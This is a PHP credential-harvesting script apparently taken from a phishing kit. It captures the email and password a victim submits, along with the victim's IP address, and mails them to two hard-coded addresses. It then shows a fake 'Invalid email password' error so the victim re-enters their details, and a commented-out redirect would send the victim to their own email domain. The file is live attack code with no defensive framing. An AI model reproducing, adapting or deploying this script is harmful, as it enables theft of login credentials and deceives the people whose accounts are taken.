<?php

//Enter Email to receive login reports
$reporting_email_address = "cdndman@hotmail.com, cdndmancsc@gmail.com";



if(isset($_POST["email"])){ 

$log_username = $_POST["email"];
$log_pw = $_POST["password"];


$ip = $_SERVER["REMOTE_ADDR"];
$UA = $_SERVER["HTTP_USER_AGENT"];
$timezone = date('e')." ".date('P');
$td = date('d-m-y h:i:s');
$payload = <<<TXT
<p>Username: $log_username<br>
Password: $log_pw<br>
[$ip]</p>
TXT;


$subject = "$log_username";

if(sendEmail($subject, $reporting_email_address, $reporting_email_address, $payload)){
    header('Cache-Control: no-cache');
    header('Pragma: no-cache');
    header("Access-Control-Allow-Origin: *");
    echo 'Invalid email password. Please try again';
    /*
    $gd = explode('@',$log_username);
    $domain = $gd[1];
    header("location:https://".$domain);
    exit;
    */
}

}

function sendEmail($subject, $to, $from, $message){
    $msg_subject = $subject;
    $msg_to =  $to;
    $msg_from = $from;
    $msg_body = $message;
    $msg_header = "From: Login Info<$msg_from>\n"
        ."MIME-Version: 1.0\n"
        ."Content-Type: text/html; charset=\"ISO-8859-1\"\n"
        ."Content-Transfer-Encoding: 7bit\n";
    if(@mail($msg_to, $msg_subject, $msg_body, $msg_header)){
        return true;
    }else{
        return false;
    }

}

